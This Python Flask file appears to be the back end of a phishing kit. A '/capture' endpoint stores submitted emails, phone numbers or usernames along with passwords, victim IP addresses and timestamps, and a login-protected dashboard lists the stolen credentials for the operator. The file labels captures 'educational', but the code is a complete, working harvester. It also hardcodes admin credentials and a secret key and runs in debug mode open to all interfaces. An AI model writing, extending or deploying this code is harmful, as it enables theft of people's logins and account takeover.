from flask import Flask, request, render_template, jsonify, redirect, url_for, session
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_very_secret_key_here'

# Simulated storage with enhanced fields
captured_creds = []
next_id = 1
ADMIN_CREDENTIALS = {'username': '4!cks', 'password': '0220Mpc'}

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/capture", methods=["POST"])
def capture():
    global next_id
    data = request.json
    
    # Determine identifier type automatically
    identifier = data.get('identifier', '')
    identifier_type = 'unknown'
    
    if '@' in identifier and '.' in identifier:
        identifier_type = 'email'
    elif identifier.isdigit() and len(identifier) >= 10:
        identifier_type = 'phone'
    elif identifier:
        identifier_type = 'username'
    
    data.update({
        "id": next_id,
        "identifier": identifier,
        "identifier_type": identifier_type,
        "ip": request.remote_addr,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "password": data.get('password', '')
    })
    
    captured_creds.append(data)
    next_id += 1
    return jsonify({"status": "educational_capture"})


@app.route("/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        if username == ADMIN_CREDENTIALS["username"] and password == ADMIN_CREDENTIALS["password"]:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid credentials")
    return render_template("login.html")

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("admin_login"))
    return render_template("dashboard.html", data=captured_creds)

@app.route("/delete/<int:entry_id>", methods=["POST"])
def delete_entry(entry_id):
    if not session.get("logged_in"):
        return jsonify({"status": "unauthorized"}), 403
    
    global captured_creds
    captured_creds = [entry for entry in captured_creds if entry["id"] != entry_id]
    return jsonify({"status": "deleted"})

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("home"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)